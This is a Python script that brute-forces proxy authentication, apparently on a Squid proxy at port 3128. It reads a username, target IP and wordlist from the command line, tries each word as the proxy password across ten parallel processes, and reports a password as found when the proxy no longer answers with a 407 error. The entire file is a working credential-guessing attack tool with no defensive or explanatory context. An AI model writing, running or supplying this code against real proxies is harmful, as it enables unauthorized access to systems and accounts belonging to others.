from multiprocessing import Pool
import signal
import urllib.request as urllib2
from urllib.error import HTTPError
import sys
import os

def attack(password):
    username = sys.argv[1]
    ip = sys.argv[2]
    proxy = urllib2.ProxyHandler({"http": "http://" + username + ":" + password + "@" + ip + ":3128/"})
    opener = urllib2.build_opener(proxy)
    urllib2.install_opener(opener)

    try:
        urllib2.urlopen("http://127.0.0.1/")
        print("Password found: " + password)
        sys.exit()
        

    except HTTPError as e:
        if e.code == 407:
            pass
        else: 
            print(f"HTTP Error {e.code}: {e.reason}")

    except Exception as e:
        print(f"An error occurred: {e}")

def set_multi_process():
    original_sigint_handler = signal.signal(signal.SIGINT, signal.SIG_IGN)
    pool = Pool(processes=int(10)) #Threads
    signal.signal(signal.SIGINT, original_sigint_handler)

    wordfile = sys.argv[3]
    wordlist = [] 
    with open(wordfile,'r') as wordlist_file: 
        for each_word in wordlist_file: 
            wordlist.append(each_word.rstrip())
    try:
        start = pool.map_async(attack,wordlist)
    except KeyboardInterrupt:
        pool.terminate()
    else:
        pool.close()
    pool.join()

if __name__=="__main__":
    set_multi_process()
